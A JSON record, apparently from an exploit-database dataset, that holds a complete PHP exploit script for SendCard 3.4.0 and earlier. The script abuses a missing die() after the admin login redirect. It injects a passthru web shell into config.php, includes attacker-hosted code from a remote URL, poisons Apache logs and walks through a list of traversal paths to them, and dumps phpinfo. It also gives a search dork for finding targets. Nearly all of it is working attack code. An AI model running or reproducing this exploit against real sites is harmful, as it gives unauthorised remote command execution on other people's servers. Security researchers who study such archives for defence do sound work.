{
  "id": "2117",
  "title": "SendCard 3.4.0 - Unauthorized Administrative Access",
  "cve": null,
  "vuln_type": "rce",
  "code": "#!/usr/bin/php -q -d short_open_tag=on\r\n<?\r\necho \"SendCard <= 3.4.0 unauthorized administrative access / remote commands\\n\";\r\necho \"execution exploit\\n\";\r\necho \"by rgod rgod@autistici.org\\n\";\r\necho \"site: http://retrogod.altervista.org\\n\";\r\necho \"dork: \\\"Powered by sendcard - an advanced PHP e-card program\\\"\\n\\n\";\r\n\r\nif ($argc<4) {\r\necho \"Usage: php \".$argv[0].\" host path action [location] [cmd] OPTIONS\\n\";\r\necho \"host:      target server (ip/hostname)\\n\";\r\necho \"path:      path to sendcard\\n\";\r\necho \"action:    1 -> php injection\\n\";\r\necho \"           works against magic_quotes_gpc=Off\\n\";\r\necho \"           2 -> arbitrary remote inclusion\\n\";\r\necho \"           works against allow_url_fopen=On\\n\";\r\necho \"           3 -> arbitrary local inclusion\\n\";\r\necho \"           works regardless of php.ini settings\\n\";\r\necho \"           and if you succeed to include Apache logs\\n\";\r\necho \"           4 -> read phpinfo()\\n\";\r\necho \"[location] a remote http location with the code to include\\n\";\r\necho \"           needed by 2, with an ending slash\\n\";\r\necho \"[cmd]:     a shell command, needed by 1-3\\n\";\r\necho \"Options:\\n\";\r\necho \"   -p[port]:    specify a port other than 80\\n\";\r\necho \"   -P[ip:port]: specify a proxy\\n\";\r\necho \"Example:\\n\";\r\necho \"php \".$argv[0].\" localhost /sendcard/ 1 ls -la\\n\";\r\necho \"php \".$argv[0].\" localhost /sendcard/ 2 http://somehost.com/ ls -la\\n\";\r\necho \"php \".$argv[0].\" localhost /sendcard/ 3 ls -la\\n\";\r\necho \"php \".$argv[0].\" localhost /sendcard/ 4 > phpinfo.html\\n\";\r\necho \"php \".$argv[0].\" localhost /sendcard/ 4 -p81> phpinfo.html\\n\";\r\necho \"php \".$argv[0].\" localhost /sendcard/ 4 -P1.1.1.1:80 > phpinfo.html\\n\";\r\necho \"note: for action 2 you need this code in http://somehost.com/sendcard_setup.php/index.html :\\n\";\r\necho \"<?php set_time_limit(0);echo 'sun-tzu';passthru(\\$_SERVER(\\\"HTTP_CLIENT_IP\\\");echo 'sun-tzu';die;?>\\n\";\r\ndie;\r\n}\r\n\r\n/*\r\nsoftware site: http://www.sendcard.org/\r\n\r\nvulnerable code in admin/prepend.php near lines 32-34:\r\n\r\n[*]\r\n...\r\n\tif(!isset($_SESSION['session'][\"password\"]) || $_SESSION['session'][\"password\"] != ADMIN_PASSWORD) {\r\n\t\theader(\"Location: login.php?redirect=\" . basename($_SERVER['PHP_SELF']));\r\n\t}\r\n...\r\n\r\nshould be instead:\r\n\r\n[**]\r\n...\r\nif(!isset($_SESSION['session'][\"password\"]) || $_SESSION['session'][\"password\"] != ADMIN_PASSWORD) {\r\n\t\theader(\"Location: login.php?redirect=\" . basename($_SERVER['PHP_SELF']));\r\n\t\tdie; // <---------------------[! ;)]\r\n\t}\r\n...\r\n\r\n[*] is included by all scripts in admin/ folder\r\nthis means that maybe redirection works if you try to access the admin scripts\r\nthrough the browser... but what happens if you do the bad work through a script? eheheheheheh\r\n\r\nso you can have access to all admin scripts to...\r\n(1) inject php code in config.php through admin/setup.php script,\r\n    this works fine with magic_quotes_gpc = Off\r\n(2) inject an arbitrary http location in config.php and go to admin/mod_stats.php\r\n    to include evil code from it, this works with allow_url_fopen=On\r\n(3) include an arbitrary file from local resource thorugh admin/mod_stats.php,\r\n    ex: apache logs, this works regardless of php.ini settings...\r\n(4) see phpinfo() through admin/mod_phpinfo.php to choose which exploitation method\r\n    is better eheheheheheheh\r\n\r\n\t\t\t\t\t\t\t\t\t      */\r\nerror_reporting(0);\r\nini_set(\"max_execution_time\",0);\r\nini_set(\"default_socket_timeout\",5);\r\n\r\nfunction quick_dump($string)\r\n{\r\n  $result='';$exa='';$cont=0;\r\n  for ($i=0; $i<=strlen($string)-1; $i++)\r\n  {\r\n   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))\r\n   {$result.=\"  .\";}\r\n   else\r\n   {$result.=\"  \".$string[$i];}\r\n   if (strlen(dechex(ord($string[$i])))==2)\r\n   {$exa.=\" \".dechex(ord($string[$i]));}\r\n   else\r\n   {$exa.=\" 0\".dechex(ord($string[$i]));}\r\n   $cont++;if ($cont==15) {$cont=0; $result.=\"\\r\\n\"; $exa.=\"\\r\\n\";}\r\n  }\r\n return $exa.\"\\r\\n\".$result;\r\n}\r\n$proxy_regex = '(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\:\\d{1,5}\\b)';\r\nfunction sendpacketii($packet)\r\n{\r\n  global $proxy, $host, $port, $html, $proxy_regex;\r\n  if ($proxy=='') {\r\n    $ock=fsockopen(gethostbyname($host),$port);\r\n    if (!$ock) {\r\n      echo 'No response from '.$host.':'.$port; die;\r\n    }\r\n  }\r\n  else {\r\n   $c = preg_match($proxy_regex,$proxy);\r\n    if (!$c) {\r\n      echo 'Not a valid proxy...';die;\r\n    }\r\n    $parts=explode(':',$proxy);\r\n    echo \"Connecting to \".$parts[0].\":\".$parts[1].\" proxy...\\r\\n\";\r\n    $ock=fsockopen($parts[0],$parts[1]);\r\n    if (!$ock) {\r\n      echo 'No response from proxy...';die;\r\n   }\r\n  }\r\n  fputs($ock,$packet);\r\n  if ($proxy=='') {\r\n    $html='';\r\n    while (!feof($ock)) {\r\n      $html.=fgets($ock);\r\n    }\r\n  }\r\n  else {\r\n    $html='';\r\n    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {\r\n      $html.=fread($ock,1);\r\n    }\r\n  }\r\n  fclose($ock);\r\n}\r\n\r\n$c=4;$host=$argv[1];$path=$argv[2];$action=(int)$argv[3];\r\nif ($action==2) {$location=$argv[4]; $c=5;}$cmd=\"\";$port=80;$proxy=\"\";\r\nfor ($i=$c; $i<$argc; $i++){\r\n$temp=$argv[$i][0].$argv[$i][1];\r\nif ($action<>4)\r\n{\r\nif (($temp<>\"-p\") and ($temp<>\"-P\"))\r\n{$cmd.=\" \".$argv[$i];}\r\n}\r\nif ($temp==\"-p\")\r\n{\r\n  $port=str_replace(\"-p\",\"\",$argv[$i]);\r\n}\r\nif ($temp==\"-P\")\r\n{\r\n  $proxy=str_replace(\"-P\",\"\",$argv[$i]);\r\n}\r\n}\r\nif (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}\r\nif ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}\r\n\r\nif ($action==1)\r\n{\r\n   $shell='suntzu\");set_time_limit(0);echo \"sun-tzu\";passthru($_SERVER[\"HTTP_CLIENT_IP\"]);echo \"sun-tzu\";die(\"suntzu';\r\n   $data=\"-----------------------------7d529a1d23092a\\r\\n\";\r\n   $data.=\"Content-Disposition: form-data; name=\\\"cfg_docroot\\\";\\r\\n\";\r\n   $data.=\"Content-Type:\\r\\n\\r\\n\";\r\n   $data.=\"$shell\\r\\n\";\r\n   $data.=\"-----------------------------7d529a1d23092a--\\r\\n\";\r\n   $packet=\"POST \".$p.\"admin/setup.php?save=1 HTTP/1.0\\r\\n\";\r\n   $packet.=\"Content-Type: multipart/form-data; boundary=---------------------------7d529a1d23092a\\r\\n\";\r\n   $packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n   $packet.=\"Host: \".$host.\"\\r\\n\";\r\n   $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n   $packet.=$data;\r\n   sendpacketii($packet);\r\n   sleep(1);\r\n   $packet=\"GET \".$p.\"admin/config.php HTTP/1.0\\r\\n\";\r\n   $packet.=\"CLIENT-IP: $cmd\\r\\n\";\r\n   $packet.=\"Host: \".$host.\"\\r\\n\";\r\n   $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n   sendpacketii($packet);\r\n   if (strstr($html,\"sun-tzu\"))\r\n   {\r\n   echo \"exploit succeeded...\\n\";\r\n   $temp=explode(\"sun-tzu\",$html);\r\n   die($temp[1]);\r\n   }\r\n   else\r\n   {\r\n   echo \"exploit failed...\";\r\n   //debug\r\n   //echo $html;\r\n   }\r\n}\r\nelseif ($action==2)\r\n{\r\n   $data=\"-----------------------------7d529a1d23092a\\r\\n\";\r\n   $data.=\"Content-Disposition: form-data; name=\\\"cfg_docroot\\\";\\r\\n\";\r\n   $data.=\"Content-Type:\\r\\n\\r\\n\";\r\n   $data.=\"$location\\r\\n\";\r\n   $data.=\"-----------------------------7d529a1d23092a--\\r\\n\";\r\n   $packet=\"POST \".$p.\"admin/setup.php?save=1 HTTP/1.0\\r\\n\";\r\n   $packet.=\"Content-Type: multipart/form-data; boundary=---------------------------7d529a1d23092a\\r\\n\";\r\n   $packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n   $packet.=\"Host: \".$host.\"\\r\\n\";\r\n   $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n   $packet.=$data;\r\n   sendpacketii($packet);\r\n   $packet=\"GET \".$p.\"admin/mod_stats.php HTTP/1.0\\r\\n\";\r\n   $packet.=\"CLIENT-IP: $cmd\\r\\n\";\r\n   $packet.=\"Host: \".$host.\"\\r\\n\";\r\n   $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n   sendpacketii($packet);\r\n   if (strstr($html,\"sun-tzu\"))\r\n   {\r\n   echo \"exploit succeeded...\\n\";\r\n   $temp=explode(\"sun-tzu\",$html);\r\n   die($temp[1]);\r\n   }\r\n   else\r\n   {\r\n   //debug\r\n   echo $html;\r\n   echo \"exploit failed...see html to adjust the path...\";\r\n   }\r\n}\r\nelseif ($action==3)\r\n{\r\n$CODE=\"<?php set_time_limit(0);echo chr(115).chr(117).chr(110).chr(45).chr(116).chr(122).chr(117);passthru(\\$_SERVER[HTTP_CLIENT_IP]);echo chr(115).chr(117).chr(110).chr(45).chr(116).chr(122).chr(117);die;?>\";\r\n$packet=\"GET \".$p.$CODE.\" HTTP/1.1\\r\\n\";\r\n$packet.=\"User-Agent: \".$CODE.\"\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Connection: close\\r\\n\\r\\n\";\r\n#debug\r\n#echo quick_dump($packet);\r\nsendpacketii($packet);\r\nsleep(2);\r\n$paths= array (\r\n\"../../../../../../../../../../var/log/httpd/access_log\",\r\n\"../../../../../../../../../../var/log/httpd/error_log\",\r\n\"../apache/logs/error.log\",\r\n\"../apache/logs/access.log\",\r\n\"../../apache/logs/error.log\",\r\n\"../../apache/logs/access.log\",\r\n\"../../../apache/logs/error.log\",\r\n\"../../../apache/logs/access.log\",\r\n\"../../../../apache/logs/error.log\",\r\n\"../../../../apache/logs/access.log\",\r\n\"../../../../../apache/logs/error.log\",\r\n\"../../../../../apache/logs/access.log\",\r\n\"../logs/error.log\",\r\n\"../logs/access.log\",\r\n\"../../logs/error.log\",\r\n\"../../logs/access.log\",\r\n\"../../../logs/error.log\",\r\n\"../../../logs/access.log\",\r\n\"../../../../logs/error.log\",\r\n\"../../../../logs/access.log\",\r\n\"../../../../../logs/error.log\",\r\n\"../../../../../logs/access.log\",\r\n\"../../../../../../../../../../etc/httpd/logs/acces_log\",\r\n\"../../../../../../../../../../etc/httpd/logs/acces.log\",\r\n\"../../../../../../../../../../etc/httpd/logs/error_log\",\r\n\"../../../../../../../../../../etc/httpd/logs/error.log\",\r\n\"../../../../../../../../../../var/www/logs/access_log\",\r\n\"../../../../../../../../../../var/www/logs/access.log\",\r\n\"../../../../../../../../../../usr/local/apache/logs/access_log\",\r\n\"../../../../../../../../../../usr/local/apache/logs/access.log\",\r\n\"../../../../../../../../../../var/log/apache/access_log\",\r\n\"../../../../../../../../../../var/log/apache/access.log\",\r\n\"../../../../../../../../../../var/log/access_log\",\r\n\"../../../../../../../../../../var/www/logs/error_log\",\r\n\"../../../../../../../../../../var/www/logs/error.log\",\r\n\"../../../../../../../../../../usr/local/apache/logs/error_log\",\r\n\"../../../../../../../../../../usr/local/apache/logs/error.log\",\r\n\"../../../../../../../../../../var/log/apache/error_log\",\r\n\"../../../../../../../../../../var/log/apache/error.log\",\r\n\"../../../../../../../../../../var/log/access_log\",\r\n\"../../../../../../../../../../var/log/error_log\"\r\n);\r\n\r\nfor ($i=0; $i<count($paths); $i++)\r\n{\r\n  echo \"trying with $paths[$i] for plugin_file argument\\r\\n\";\r\n  $packet=\"GET \".$p.\"admin/mod_plugins.php HTTP/1.0\\r\\n\";\r\n  $packet.=\"Host: \".$host.\"\\r\\n\";\r\n  $packet.=\"CLIENT-IP: $cmd\\r\\n\";\r\n  $packet.=\"Cookie: plugin_file=\".urlencode($paths[$i]).\";\\r\\n\";\r\n  $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n  sendpacketii($packet);\r\n  if (strstr($html,\"sun-tzu\"))\r\n  {\r\n  echo \"exploit succeeded...\\n\\n\";\r\n  $temp=explode(\"sun-tzu\",$html);\r\n  echo $temp[1]; die;\r\n  }\r\n}\r\n//if you are here...\r\ndie(\"exploit failed...\");\r\n}\r\nelseif ($action==4)\r\n{\r\n   $packet=\"GET \".$p.\"admin/mod_phpinfo.php HTTP/1.0\\r\\n\";\r\n   $packet.=\"Host: \".$host.\"\\r\\n\";\r\n   $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n   sendpacketii($packet);\r\n   $temp=explode(\"<!DOCTYPE\",$html); //remove http headers\r\n   echo \"<!DOCTYPE\".$temp[1];\r\n}\r\nelse echo (\"specify an action [1-4]...\");\r\n?>\r\n\r\n# milw0rm.com [2006-08-03]\r\n      ",
  "url": "https://www.exploit-db.com/exploits/2117"
}